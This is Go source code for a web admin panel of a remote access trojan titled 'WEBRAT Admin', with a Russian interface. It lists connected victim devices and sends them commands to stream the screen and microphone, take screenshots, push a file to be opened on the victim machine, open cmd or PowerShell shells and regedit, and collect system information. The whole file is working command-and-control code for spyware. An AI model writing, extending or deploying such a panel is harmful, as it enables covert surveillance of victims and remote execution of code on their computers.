package main

import (
	"encoding/json"
	"html/template"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type Device struct {
	ID        string     `json:"id"`
	Name      string     `json:"name"`
	Status    string     `json:"status"`
	CreatedAt time.Time  `json:"created_at"`
	LastSeen  *time.Time `json:"last_seen"`
}

type PageData struct {
	APIBase      string
	Devices      []Device
	ErrorText    string
	AllowedHosts []string
}

func apiBase() string {
	if v := os.Getenv("API_BASE_URL"); v != "" {
		return v
	}
	return "http://localhost:8080"
}

func allowedHosts() map[string]struct{} {
	v := os.Getenv("ALLOW_HOSTS")
	if v == "" {
		return map[string]struct{}{}
	}
	m := map[string]struct{}{}
	for _, h := range strings.Split(v, ",") {
		h = strings.TrimSpace(h)
		if h != "" {
			m[h] = struct{}{}
		}
	}
	return m
}

func fetchDevices(client *http.Client) ([]Device, error) {
	req, _ := http.NewRequest("GET", apiBase()+"/api/devices", nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var devices []Device
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		if err := json.NewDecoder(resp.Body).Decode(&devices); err != nil {
			return nil, err
		}
		return devices, nil
	}
	b, _ := io.ReadAll(resp.Body)
	return nil, &httpError{Code: resp.StatusCode, Body: string(b)}
}

type httpError struct {
	Code int
	Body string
}

func (e *httpError) Error() string {
	return e.Body
}

var tpl = template.Must(template.New("index").Parse(`
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>WEBRAT Admin</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root { --bg:#0b0b0b; --fg:#00ff88; --muted:#0f3f2c; --accent:#22ffaa; }
    * { box-sizing: border-box; }
    body { margin:0; background:var(--bg); color:var(--fg); font-family: Consolas, Monaco, 'SFMono-Regular', Menlo, monospace; }
    .screen { padding:16px; min-height:100vh; border:2px solid var(--muted); outline:4px solid #000; }
    .ascii { white-space:pre; color:var(--accent); line-height:1; font-size:14px; margin:0 0 12px 0; }
    .status { display:flex; gap:12px; align-items:center; font-size:12px; opacity:.8; }
    .grid { display:grid; grid-template-columns: 300px 1fr; gap:16px; margin-top:12px; }
    .panel { border:1px dashed var(--muted); padding:12px; }
    .title { font-weight:700; margin:0 0 8px 0; letter-spacing:.06em; }
    .devices { display:flex; flex-direction:column; gap:6px; }
    .device { background:#0d0d0d; color:var(--fg); border:1px solid var(--muted); padding:8px; cursor:pointer; display:flex; justify-content:space-between; align-items:center; }
    .device:hover { background:#0e1210; border-color:var(--accent); }
    .badge { font-size:11px; padding:2px 6px; border:1px solid var(--muted); }
    .form { display:flex; gap:8px; margin-top:10px; }
    input, button { background:#0d0d0d; color:var(--fg); border:1px solid var(--muted); padding:8px; }
    button { cursor:pointer; }
    .error { color:#ff4d4d; }
    .sidebar { display:none; flex-direction:column; gap:10px; }
    .tabs { display:flex; gap:8px; }
    .tab { padding:8px 10px; border:1px solid var(--muted); background:#0d0d0d; cursor:pointer; }
    .tab.active { border-color:var(--accent); color:var(--accent); }
    .tabcontent { border:1px dashed var(--muted); padding:10px; min-height:160px; }
  </style>
</head>
<body>
  <div class="screen">
    <pre class="ascii">
__        __  ______  ______  _____   _______ 
\\ \\      / / |  ____||  ____||  __ \\ |__   __|
 \\ \\ /\\ / /  | |__   | |__   | |__) |   | |   
  \\ V  V /   |  __|  |  __|  |  _  /    | |   
   \\_/\\_/    | |____ | |____ | | \\ \\    | |   
             |______||______||_|  \\_\\   |_|   
    </pre>
    <div class="status">
      <div>API: <span id="apibase"></span></div>
      <label style="display:flex; gap:6px; align-items:center;">
        <input id="apibaseInput" list="hostslist" placeholder="http://host:port" style="width:240px"/>
        <button id="apibaseApply" type="button">применить</button>
      </label>
      <datalist id="hostslist">
        {{range .AllowedHosts}}<option value="http://{{.}}"></option>{{end}}
      </datalist>
    </div>
    {{if .ErrorText}}<div class="error">{{.ErrorText}}</div>{{end}}
    <div class="grid">
      <div class="panel">
        <div class="title">устройства</div>
        <div id="devices" class="devices">
          {{range .Devices}}
            <div class="device" data-id="{{.ID}}" data-name="{{.Name}}" data-status="{{.Status}}" data-lastseen="{{.LastSeen}}">
              <div>{{.Name}}</div><div class="badge">{{.Status}}</div>
            </div>
          {{end}}
        </div>
        <form class="form" method="post" action="/register">
          <input type="text" name="name" placeholder="имя устройства">
          <button type="submit">добавить</button>
        </form>
      </div>
      <div class="panel">
        <div id="sidebar" class="sidebar">
          <div class="title" id="devtitle"></div>
          <div class="tabs">
            <div class="tab active" data-tab="stream">стрим</div>
            <div class="tab" data-tab="snapshot">скриншот</div>
            <div class="tab" data-tab="files">файлы</div>
            <div class="tab" data-tab="tools">инструменты</div>
            <div class="tab" data-tab="info">инфо</div>
          </div>
          <div id="tabcontent" class="tabcontent"></div>
        </div>
        <div id="sidebarEmpty" style="opacity:.7">выберите устройство, чтобы открыть сайдбар</div>
      </div>
    </div>
  </div>
  <script>
    let API = (localStorage.getItem('apiBase') || "{{.APIBase}}");
    document.getElementById('apibase').textContent = API;
    document.getElementById('apibaseInput').value = API;
    function setApiBase(v) {
      try {
        v = String(v||'').trim();
        if (!/^https?:\\/\\//i.test(v)) return;
        API = v.replace(/\\/+$/,'');
        localStorage.setItem('apiBase', API);
        document.getElementById('apibase').textContent = API;
        refreshDevicesList();
        selectedDevice = null;
        sidebar.style.display = 'none';
        sidebarEmpty.style.display = '';
      } catch {}
    }
    document.getElementById('apibaseApply').onclick = ()=>setApiBase(document.getElementById('apibaseInput').value);
    const sidebar = document.getElementById('sidebar');
    const sidebarEmpty = document.getElementById('sidebarEmpty');
    const devtitle = document.getElementById('devtitle');
    const tabcontent = document.getElementById('tabcontent');
    let selectedDevice = null;
    async function refreshDevicesList() {
      try {
        const r = await fetch(API + '/api/devices').catch(()=>null);
        if (!r || !r.ok) return;
        const list = await r.json().catch(()=>[]);
        const online = Array.isArray(list) ? list.filter(d=>String(d.status||'')==='online') : [];
        const c = document.getElementById('devices');
        c.innerHTML = '';
        if (online.length === 0) {
          c.innerHTML = '<div style="opacity:.7">нет онлайн устройств</div>';
          if (!selectedDevice || !online.find(d=>String(d.id||'')===String(selectedDevice.id||''))) {
            selectedDevice = null;
            sidebar.style.display = 'none';
            sidebarEmpty.style.display = '';
          }
          return;
        }
        online.forEach(d=>{
          const el = document.createElement('div');
          el.className = 'device';
          el.dataset.id = d.id;
          el.dataset.name = d.name;
          el.dataset.status = d.status;
          el.dataset.lastseen = d.last_seen || '';
          const left = document.createElement('div'); left.textContent = d.name;
          const badge = document.createElement('div'); badge.className = 'badge';
          let ls = '';
          const raw = d.last_seen;
          if (raw && raw !== '<nil>' && raw !== 'null' && raw !== 'undefined') {
            const t = new Date(raw);
            const dsec = (Date.now() - t.getTime())/1000;
            ls = dsec<60 ? (Math.floor(dsec)+' сек') : dsec<3600 ? (Math.floor(dsec/60)+' мин') : (Math.floor(dsec/3600)+' ч');
          }
          badge.textContent = 'online' + (ls ? (' · ' + ls + ' назад') : '');
          el.appendChild(left);
          el.appendChild(badge);
          c.appendChild(el);
        });
      } catch {}
    }
    function selectDevice(el) {
      selectedDevice = { id: el.dataset.id, name: el.dataset.name, status: el.dataset.status, lastseen: el.dataset.lastseen || '' };
      let ls = '';
      const lsRaw = selectedDevice.lastseen;
      if (lsRaw && lsRaw !== '<nil>' && lsRaw !== 'null' && lsRaw !== 'undefined') {
        const t = new Date(lsRaw);
        const d = (Date.now() - t.getTime())/1000;
        const human = d<60 ? (Math.floor(d)+' сек назад') : d<3600 ? (Math.floor(d/60)+' мин назад') : (Math.floor(d/3600)+' ч назад');
        ls = ' last_seen: ' + human;
      }
      devtitle.textContent = selectedDevice.name + ' [' + selectedDevice.status + ']' + ls;
      sidebar.style.display = 'flex';
      sidebarEmpty.style.display = 'none';
      switchTab('stream');
    }
    function sendAdminCommand(msg) {
          const wsUrl = (API.startsWith('https') ? API.replace(/^https/, 'wss') : API.replace(/^http/, 'ws')) + '/ws/admin?deviceId=' + selectedDevice.id;
      const w = new WebSocket(wsUrl);
      w.onopen = () => {
        try { w.send(JSON.stringify(msg)); } catch {}
        try { setTimeout(()=>{ try { w.close(); } catch {} }, 500); } catch {}
      };
      w.onerror = () => { try { w.close(); } catch {} };
    }
    async function action(path, method='POST', body=null) {
      const r = await fetch(API + path, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: body ? JSON.stringify(body) : null
      }).catch(()=>null);
      if (!r || !r.ok) {
        let text = 'network error';
        let status = 0;
        try {
          status = r?.status || 0;
          text = await r?.text();
        } catch {}
        return { error: true, status, text };
      }
      return await r.json().catch(()=>({ ok:true, text:'ok' }));
    }
    function switchTab(name) {
      document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === name));
      if (name === 'stream') {
        tabcontent.innerHTML = '<div class="controls" style="display:flex; gap:8px; flex-wrap:wrap; align-items:center">'
          + '<label>тип:'
          + '<select id="mode">'
          + '<option value="screen">экран</option>'
          + '<option value="mic">микрофон</option>'
          + '</select>'
          + '</label>'
          + '<fieldset style="display:flex; gap:8px; align-items:center; border:1px dashed var(--muted); padding:6px;"><legend style="padding:0 6px">слушать</legend>'
          + '<label style="display:flex; gap:4px; align-items:center;"><input type="checkbox" id="listenFrame" checked/> кадры</label>'
          + '<label style="display:flex; gap:4px; align-items:center;"><input type="checkbox" id="listenAudio" checked/> аудио</label>'
          + '<label style="display:flex; gap:4px; align-items:center;"><input type="checkbox" id="listenStatus" checked/> статус</label>'
          + '<label style="display:flex; gap:4px; align-items:center;"><input type="checkbox" id="listenFiles"/> файлы</label>'
          + '</fieldset>'
          + '<label id="fpswrap">fps:'
          + '<input type="number" id="fps" min="1" max="60" value="10" style="width:80px"/>'
          + '</label>'
          + '<label id="qwrap">качество:'
          + '<input type="number" id="quality" min="30" max="95" value="75" style="width:80px"/>'
          + '</label>'
          + '<label id="displaywrap">экран:'
          + '<select id="display"><option value="">загрузка...</option></select>'
          + '</label>'
          
          + '<label id="micwrap">микрофон:'
          + '<select id="mic"><option value="">нет данных</option></select>'
          + '</label>'
          + '<label id="arwrap">rate:'
          + '<input type="number" id="ar" min="8000" max="96000" value="48000" style="width:100px"/>'
          + '</label>'
          + '<label id="achwrap">channels:'
          + '<input type="number" id="ach" min="1" max="2" value="1" style="width:80px"/>'
          + '</label>'
          + '<label id="amswrap">chunk_ms:'
          + '<input type="number" id="ams" min="5" max="50" value="20" style="width:80px"/>'
          + '</label>'
          + '<label id="volwrap" style="display:flex; gap:6px; align-items:center;">громкость:'
          + '<input type="range" id="vol" min="0" max="1" step="0.01" value="1" style="width:120px"/>'
          + '<label style="display:flex; gap:4px; align-items:center;"><input type="checkbox" id="mute"/>mute</label>'
          + '</label>'
          + '<button id="refresh">обновить устройства</button>'
          + '<button id="start" type="button">старт</button>'
          + '<button id="stop" type="button">стоп</button>'
          + '</div>'
          + '<div style="margin-top:8px"><img id="streamimg" style="max-width:100%"/></div>'
          + '<div id="stats" style="margin-top:6px; font-size:12px; opacity:.85"></div>'
          + '<div id="out" style="margin-top:8px"></div>';
        let ws = null;
        let last = 0;
        const intervals = [];
        const out = document.getElementById('out');
        const startBtn = document.getElementById('start');
        const stopBtn = document.getElementById('stop');
        const refreshBtn = document.getElementById('refresh');
        const stats = document.getElementById('stats');
        const displaySel = document.getElementById('display');
        
        const micSel = document.getElementById('mic');
        const modeSel = document.getElementById('mode');
        const fpsInput = document.getElementById('fps');
        const qInput = document.getElementById('quality');
        
        const arInput = document.getElementById('ar');
        const achInput = document.getElementById('ach');
        const amsInput = document.getElementById('ams');
        const vol = document.getElementById('vol');
        const mute = document.getElementById('mute');
        const volwrap = document.getElementById('volwrap');
        const displaywrap = document.getElementById('displaywrap');
        
        const micwrap = document.getElementById('micwrap');
        const fpswrap = document.getElementById('fpswrap');
        const qwrap = document.getElementById('qwrap');
        
        const arwrap = document.getElementById('arwrap');
        const achwrap = document.getElementById('achwrap');
        const amswrap = document.getElementById('amswrap');
        startBtn.disabled = true;
        stopBtn.disabled = true;
        refreshBtn.disabled = false;
        if (String(selectedDevice.status||'') !== 'online') {
          out.textContent = 'устройство офлайн — стрим недоступен';
          startBtn.disabled = true;
        }
        let isStreaming = false;
        let wsRetries = 0;
        let reconnectTimer = null;
        const bytesRecent = [];
        let audioCtx = null;
        let gainNode = null;
        let nextAudioTime = 0;
        function ensureAudioCtx() {
          if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            gainNode = audioCtx.createGain();
            gainNode.gain.value = Number(vol?.value || 1);
            gainNode.connect(audioCtx.destination);
            nextAudioTime = audioCtx.currentTime;
          }
        }
        function playPCM16LE(b64, sampleRate, channels) {
          try {
            ensureAudioCtx();
            const bin = atob(b64);
            const rate = Number(sampleRate||48000);
            const chs = Math.max(1, Number(channels||1));
            const bytes = bin.length;
            const samples = (bytes/2/chs)|0;
            const buf = audioCtx.createBuffer(chs, samples, rate);
            const dv = new DataView(new ArrayBuffer(bytes));
            for (let i=0;i<bytes;i++) dv.setUint8(i, bin.charCodeAt(i));
            for (let c=0;c<chs;c++) {
              const outCh = buf.getChannelData(c);
              let idx = c*2;
              for (let s=0;s<samples;s++, idx+=chs*2) {
                outCh[s] = dv.getInt16(idx, true) / 32768;
              }
            }
            const src = audioCtx.createBufferSource();
            src.buffer = buf;
            src.connect(gainNode||audioCtx.destination);
            const now = audioCtx.currentTime;
            if (nextAudioTime < now - 0.2) nextAudioTime = now;
            if (nextAudioTime > now + 0.8) nextAudioTime = now + 0.1;
            const startAt = Math.max(nextAudioTime, now);
            src.start(startAt);
            nextAudioTime = startAt + buf.duration;
          } catch(e) {}
        }
        function updateControlsVisibility() {
          const m = modeSel.value;
          displaywrap.style.display = (m==='screen') ? 'inline-flex' : 'none';
          micwrap.style.display = (m==='mic') ? 'inline-flex' : 'none';
          volwrap.style.display = (m==='mic') ? 'flex' : 'none';
          fpswrap.style.display = (m==='screen') ? 'inline-flex' : 'none';
          qwrap.style.display = (m==='screen') ? 'inline-flex' : 'none';
          arwrap.style.display = (m==='mic') ? 'inline-flex' : 'none';
          achwrap.style.display = (m==='mic') ? 'inline-flex' : 'none';
          amswrap.style.display = (m==='mic') ? 'inline-flex' : 'none';
        }
        updateControlsVisibility();
        modeSel.addEventListener('change', updateControlsVisibility);
        vol?.addEventListener('input', ()=>{ if (gainNode) { gainNode.gain.value = Number(vol.value); } });
        mute?.addEventListener('change', ()=>{ if (gainNode) { gainNode.gain.value = mute.checked ? 0 : Number(vol?.value||1); } });
        async function loadSources() {
          out.textContent = 'запрашиваю устройства...';
          await action('/api/devices/'+selectedDevice.id+'/sources', 'POST');
          let tries = 0;
          const timer = setInterval(async ()=>{
            tries++;
            const r = await fetch(API+'/api/devices/'+selectedDevice.id+'/sources-last').catch(()=>null);
            if (r && r.ok) {
              const j = await r.json().catch(()=>null);
              if (j && j.result) {
                displaySel.innerHTML = '';
                const displays = (j.result.displays||[]);
                if (displays.length === 0) {
                  displaySel.innerHTML = '<option value="">нет экранов</option>';
                } else {
                  displays.forEach((d,idx)=>{
                    const opt = document.createElement('option');
                    opt.value = String(d.index ?? idx);
                    opt.textContent = d.name || ('экран '+opt.value);
                    displaySel.appendChild(opt);
                  });
                }
                
                micSel.innerHTML = '';
                const mics = (j.result.microphones||[]);
                if (mics.length === 0) micSel.innerHTML = '<option value="">нет микрофонов</option>';
                else mics.forEach((m)=>{
                  const opt = document.createElement('option'); opt.value = m; opt.textContent = m; micSel.appendChild(opt);
                });
                out.textContent = 'устройства обновлены';
                updateControlsVisibility();
                if (String(selectedDevice.status||'') === 'online') startBtn.disabled = false;
                clearInterval(timer);
              }
            }
            if (tries>25) { clearInterval(timer); out.textContent = 'нет ответа: проверьте, что выбран правильный клиент и он запущен'; }
          }, 1000);
        }
        document.getElementById('refresh').onclick = loadSources;
        loadSources();
        function connectWS() {
          if (ws) { try { ws.close(); } catch{} ws=null; }
          const wsUrl = API.replace(/^http/, 'ws') + '/ws/admin?deviceId=' + selectedDevice.id;
          ws = new WebSocket(wsUrl);
          let noFrameTimer = null;
          function updateSubscription() {
            const lf = document.getElementById('listenFrame');
            const la = document.getElementById('listenAudio');
            const ls = document.getElementById('listenStatus');
            const lfiles = document.getElementById('listenFiles');
            const listen = [];
            if (lf?.checked) listen.push('frame');
            if (la?.checked) listen.push('audio');
            if (ls?.checked) listen.push('status');
            if (lfiles?.checked) listen.push('files');
            try { if (ws && ws.readyState === 1) ws.send(JSON.stringify({ type: 'subscribe', listen })); } catch {}
          }
          ws.onopen = () => {
            out.textContent = 'подключено';
            wsRetries = 0;
            if (modeSel.value==='mic') { try { ensureAudioCtx(); } catch{} }
            if (noFrameTimer) { clearTimeout(noFrameTimer); }
            noFrameTimer = setTimeout(()=>{
              if (!ws || ws.readyState !== 1) return;
              out.textContent = 'нет кадров: проверьте, что клиент запущен, выбран правильный дубль устройства и совпадает STREAM_SECRET';
            }, 6000);
            updateSubscription();
          };
          document.getElementById('listenFrame')?.addEventListener('change', updateSubscription);
          document.getElementById('listenAudio')?.addEventListener('change', updateSubscription);
          document.getElementById('listenStatus')?.addEventListener('change', updateSubscription);
          document.getElementById('listenFiles')?.addEventListener('change', updateSubscription);
          ws.onmessage = (ev) => {
            try {
              const j = JSON.parse(ev.data);
              if (j && j.type === 'frame' && j.b64) {
                // got frame; cancel no-frame warning
                // note: j.b64 is base64
                const fmt = j.format || 'jpeg';
                document.getElementById('streamimg').src = 'data:image/'+fmt+';base64,'+j.b64;
                const now = Date.now();
                if (last) {
                  const d = now - last;
                  intervals.push(d);
                  if (intervals.length > 30) intervals.shift();
                  const avg = intervals.reduce((a,b)=>a+b,0)/intervals.length;
                  const fps = avg>0 ? (1000/avg) : 0;
                  const bytes = Math.floor((j.b64.length||0)*0.75);
                  bytesRecent.push(bytes);
                  if (bytesRecent.length>30) bytesRecent.shift();
                  const avgBytes = bytesRecent.reduce((a,b)=>a+b,0) / (bytesRecent.length||1);
                  const kbps = fps * avgBytes * 8 / 1000;
                  stats.textContent = 'fps: ' + fps.toFixed(1) + ', ~' + Math.round(kbps) + ' kbps';
                }
                last = now;
                try { if (noFrameTimer) { clearTimeout(noFrameTimer); noFrameTimer=null; } } catch{}
              } else if (j && j.type === 'audio' && j.b64) {
                playPCM16LE(j.b64, j.sampleRate||48000, j.channels||1);
                stats.textContent = 'аудио: ' + String(j.sampleRate||48000) + ' Hz, ch: ' + String(j.channels||1);
              } else if (j && j.type === 'status') {
                if (String(j.status||'') === 'device_connected') {
                  out.textContent = 'клиент подключен';
                } else if (String(j.status||'') === 'device_disconnected') {
                  out.textContent = 'клиент отключился';
                } else if (String(j.status||'') === 'decrypt_error') {
                  out.textContent = 'ошибка расшифровки: проверьте STREAM_SECRET на сервере и клиенте';
                }
              }
            } catch {}
          };
          ws.onclose = () => {
            out.textContent = 'ws закрыт';
            try { audioCtx && audioCtx.close(); } catch{} audioCtx=null; gainNode=null; nextAudioTime=0;
            try { if (noFrameTimer) { clearTimeout(noFrameTimer); noFrameTimer=null; } } catch{}
            if (isStreaming) {
              const delays = [1000, 2000, 5000, 5000, 5000];
              const delay = delays[Math.min(wsRetries, delays.length-1)];
              wsRetries++;
              if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer=null; }
              reconnectTimer = setTimeout(()=>{ connectWS(); }, delay);
              out.textContent = 'переподключение через ' + Math.round(delay/1000) + 'с (попытка ' + wsRetries + ')';
            }
          };
          ws.onerror = () => { out.textContent = 'ошибка ws'; };
        }
        document.getElementById('start').onclick = async () => {
          const payload = {
            source: modeSel.value,
            display: Number(displaySel.value||0),
            mic: micSel.value||'',
            fps: Number(fpsInput?.value||0),
            jpegQuality: Number(qInput?.value||0),
            audioRate: Number(arInput?.value||0),
            audioChannels: Number(achInput?.value||0),
            audioChunkMs: Number(amsInput?.value||0)
          };
          if (payload.source==='mic' && !payload.mic) { out.textContent = 'выберите микрофон'; return; }
          isStreaming = true;
          startBtn.disabled = true;
          refreshBtn.disabled = true;
          stopBtn.disabled = false;
          const res = await action('/api/devices/'+selectedDevice.id+'/start', 'POST', payload);
          out.textContent = JSON.stringify(res);
          if (res && res.error) {
            isStreaming = false;
            startBtn.disabled = false;
            refreshBtn.disabled = false;
            stopBtn.disabled = true;
            return;
          }
          try { sendAdminCommand({ type: 'start_stream', ...payload }); } catch {}
          connectWS();
        };
        document.getElementById('stop').onclick = async () => {
          const out = document.getElementById('out');
          isStreaming = false;
          wsRetries = 0;
          const res = await action('/api/devices/'+selectedDevice.id+'/stop');
          out.textContent = JSON.stringify(res);
          const img = document.getElementById('streamimg'); img.src='';
          if (ws) { ws.close(); ws = null; }
          if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer=null; }
          document.getElementById('start').disabled = false;
          document.getElementById('refresh').disabled = false;
          document.getElementById('stop').disabled = true;
          try { audioCtx && audioCtx.close(); } catch{} audioCtx=null; gainNode=null; nextAudioTime=0;
          try { sendAdminCommand({ type: 'stop_stream' }); } catch {}
        };
      } else if (name === 'snapshot') {
        tabcontent.innerHTML = '<div class=\"controls\"><button id=\"shot\">скриншот</button></div><div style=\"margin-top:8px\"><img id=\"snapimg\" style=\"max-width:100%\"/></div><div id=\"out\" style=\"margin-top:8px\"></div>';
        document.getElementById('shot').onclick = async () => {
          const out = document.getElementById('out');
          const res = await action('/api/devices/'+selectedDevice.id+'/snapshot');
          out.textContent = JSON.stringify(res);
          setTimeout(async () => {
            const r = await fetch(API+'/api/devices/'+selectedDevice.id+'/last-snapshot').catch(()=>null);
            if (!r || !r.ok) return;
            const j = await r.json().catch(()=>null);
            if (j && j.result && j.result.png_b64) {
              document.getElementById('snapimg').src = 'data:image/png;base64,'+j.result.png_b64;
            }
          }, 1000);
        };
      } else if (name === 'files') {
        tabcontent.innerHTML = '<div class=\"controls\" style=\"display:flex; gap:8px; flex-wrap:wrap; align-items:center\">'
          + '<input type=\"file\" id=\"file\"/>'
          + '<button id=\"upload\">загрузить на сервер</button>'
          + '<input type=\"file\" id=\"clientfile\"/>'
          + '<button id=\"sendopen\">отправить и открыть на клиенте</button>'
          + '</div>'
          + '<div id=\"files\" style=\"margin-top:8px\"></div>';
        document.getElementById('upload').onclick = async () => {
          const input = document.getElementById('file');
          const f = input.files && input.files[0];
          if (!f) return;
          const reader = new FileReader();
          reader.onload = async () => {
            const b64 = String(reader.result).split(',')[1] || '';
            const res = await action('/api/devices/'+selectedDevice.id+'/files', 'POST', { filename: f.name.replace(/[^a-zA-Z0-9_.-]/g,''), b64 });
            switchTab('files');
          };
          reader.readAsDataURL(f);
        };
        document.getElementById('sendopen').onclick = async () => {
          const input = document.getElementById('clientfile');
          const f = input.files && input.files[0];
          if (!f) return;
          const reader = new FileReader();
          reader.onload = async () => {
            const b64 = String(reader.result).split(',')[1] || '';
            const safe = f.name.replace(/[^a-zA-Z0-9_.-]/g,'');
            sendAdminCommand({ type: 'file_open_plain', filename: safe || 'file.bin', b64 });
          };
          reader.readAsDataURL(f);
        };
        fetch(API+'/api/devices/'+selectedDevice.id+'/snapshots-files').then(r=>r.ok ? r.json() : []).then(list=>{
          const c = document.getElementById('files');
          c.innerHTML = '';
          (Array.isArray(list) ? list : []).forEach(it=>{
            const a = document.createElement('a');
            a.href = API + it.url;
            a.download = it.file;
            const img = document.createElement('img');
            img.src = a.href;
            img.style.maxWidth = '100%';
            img.style.border = '1px solid var(--muted)';
            img.style.marginBottom = '8px';
            c.appendChild(img);
            const btn = document.createElement('button');
            btn.textContent = 'скачать';
            btn.onclick = ()=>a.click();
            c.appendChild(btn);
          });
          fetch(API+'/api/devices/'+selectedDevice.id+'/files').then(r=>r.ok ? r.json() : []).then(files=>{
            const c = document.getElementById('files');
            (Array.isArray(files) ? files : []).forEach(it=>{
              const link = document.createElement('a');
              link.href = API + it.url;
              link.textContent = it.file;
              link.style.display = 'block';
              c.appendChild(link);
            });
          }).catch(()=>{});
        }).catch(()=>{});
      } else if (name === 'info') {
        tabcontent.innerHTML = '<div class=\"controls\"><button id=\"info\">запросить инфо</button></div><pre id=\"infoout\" style=\"margin-top:8px\"></pre>';
        document.getElementById('info').onclick = async () => {
          const res = await action('/api/devices/'+selectedDevice.id+'/info');
          const infoout = document.getElementById('infoout');
          infoout.textContent = JSON.stringify(res);
          let tries = 0;
          const timer = setInterval(async ()=>{
            tries++;
            const r = await fetch(API+'/api/devices/'+selectedDevice.id+'/tasks').catch(()=>null);
            if (!r || !r.ok) return;
            const list = await r.json().catch(()=>null);
            if (Array.isArray(list)) {
              const item = list.find(it=>it.type==='collect_info' && it.status==='done');
              if (item && item.result) {
                infoout.textContent = JSON.stringify(item.result, null, 2);
                clearInterval(timer);
              }
            }
            if (tries>10) clearInterval(timer);
          }, 1000);
        };
      } else if (name === 'tools') {
        tabcontent.innerHTML = '<div class=\"controls\" style=\"display:flex; gap:8px; flex-wrap:wrap; align-items:center\">'
          + '<label>путь (для проводника):<input type=\"text\" id=\"explorerPath\" placeholder=\"C:\\\\\" style=\"width:240px\"/></label>'
          + '<button id=\"openExplorer\">открыть проводник</button>'
          + '<label>shell:<select id=\"shellCmd\"><option value=\"cmd.exe\">cmd</option><option value=\"powershell.exe\">powershell</option></select></label>'
          + '<button id=\"openShell\">открыть shell</button>'
          + '<button id=\"openRegedit\">открыть regedit</button>'
          + '</div>'
          + '<div id=\"toolsout\" style=\"margin-top:8px\"></div>';
        document.getElementById('openExplorer').onclick = () => {
          const p = document.getElementById('explorerPath').value || '';
          sendAdminCommand({ type: 'open_explorer', path: p });
          document.getElementById('toolsout').textContent = 'команда отправлена';
        };
        document.getElementById('openShell').onclick = () => {
          const cmd = document.getElementById('shellCmd').value || 'cmd.exe';
          sendAdminCommand({ type: 'open_shell', cmd });
          document.getElementById('toolsout').textContent = 'команда отправлена';
        };
        document.getElementById('openRegedit').onclick = () => {
          sendAdminCommand({ type: 'open_regedit' });
          document.getElementById('toolsout').textContent = 'команда отправлена';
        };
      }
    }
    document.getElementById('devices').addEventListener('click', e => {
      const el = e.target.closest('.device');
      if (el) selectDevice(el);
    });
    refreshDevicesList();
    setInterval(refreshDevicesList, 5000);
    document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', e => switchTab(t.dataset.tab)));
  </script>
</body>
</html>
`))

func indexHandler(w http.ResponseWriter, r *http.Request) {
	client := &http.Client{Timeout: 10 * time.Second}
	devs, err := fetchDevices(client)
	online := make([]Device, 0, len(devs))
	for _, d := range devs {
		if strings.EqualFold(d.Status, "online") {
			online = append(online, d)
		}
	}
	hostsMap := allowedHosts()
	hosts := make([]string, 0, len(hostsMap))
	for h := range hostsMap {
		hosts = append(hosts, h)
	}
	data := PageData{APIBase: apiBase(), Devices: online, AllowedHosts: hosts}
	if err != nil {
		data.ErrorText = err.Error()
		if len(devs) == 0 {
			data.Devices = []Device{{ID: "demo", Name: "demo-device", Status: "offline", CreatedAt: time.Now()}}
		}
	}
	_ = tpl.Execute(w, data)
}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad form", http.StatusBadRequest)
		return
	}
	name := strings.TrimSpace(r.Form.Get("name"))
	if name == "" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}
	body := strings.NewReader(`{"name":"` + strings.ReplaceAll(name, `"`, `\"`) + `"}`)
	req, _ := http.NewRequest("POST", apiBase()+"/api/devices/register", body)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, "api error", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func fetchHandler(w http.ResponseWriter, r *http.Request) {
	u := r.URL.Query().Get("url")
	if u == "" {
		http.Error(w, "missing url", http.StatusBadRequest)
		return
	}
	parsed, err := url.Parse(u)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		http.Error(w, "invalid url", http.StatusBadRequest)
		return
	}
	allowed := allowedHosts()
	if len(allowed) > 0 {
		if _, ok := allowed[parsed.Host]; !ok {
			http.Error(w, "host not allowed", http.StatusForbidden)
			return
		}
	}
	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("GET", u, nil)
	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, "fetch error", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	for k, v := range resp.Header {
		if len(v) > 0 {
			w.Header().Set(k, v[0])
		}
	}
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, resp.Body)
}

func main() {
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/register", registerHandler)
	http.HandleFunc("/fetch", fetchHandler)
	port := os.Getenv("ADMIN_PORT")
	if port == "" {
		port = "3000"
	}
	_ = http.ListenAndServe(":"+port, nil)
}
